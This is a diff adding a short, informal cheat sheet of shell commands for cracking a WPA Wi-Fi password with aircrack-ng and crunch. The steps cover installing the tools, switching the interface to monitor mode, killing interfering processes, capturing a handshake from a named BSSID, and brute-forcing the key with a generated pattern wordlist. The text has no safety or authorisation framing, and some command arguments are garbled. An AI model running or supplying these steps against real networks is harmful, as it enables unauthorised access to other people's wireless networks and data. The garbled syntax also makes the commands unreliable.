@@ -1,0 +1,16 @@
+@@aircrack and crunch@@
+@install aircrack and crunch
+apt-get install aircrack-ng -y
+apt-get install crunch -y
+
+ifconfig (name of ur wifiinterface) down @@to shutdown
+iwconfig (name of ur wifiinterface) mode monitor
+ifconfig (name of ur wifiinterface) up
+airmon-ng check (name of ur wifiinterface)
+@kill them all
+Kill (PID)
+airodump-ng (name of ur wifiinterface)
+@write this command airodump-ng -c (channel) -w (filename to save) --bssid (BSSID) (name of ur wifiinterface)
+airodump-ng -c 6 -w SCAN1 --bssid 90:f6:52:C1:BB:18 (name of ur wifiinterface)
+@wait untill WPA Hanshake appears
+crunch 11 11 -t %%%%abcdf 1234567890 | aircrack-ng -w (word list) - (capturedfile.cap) -e (SSID)
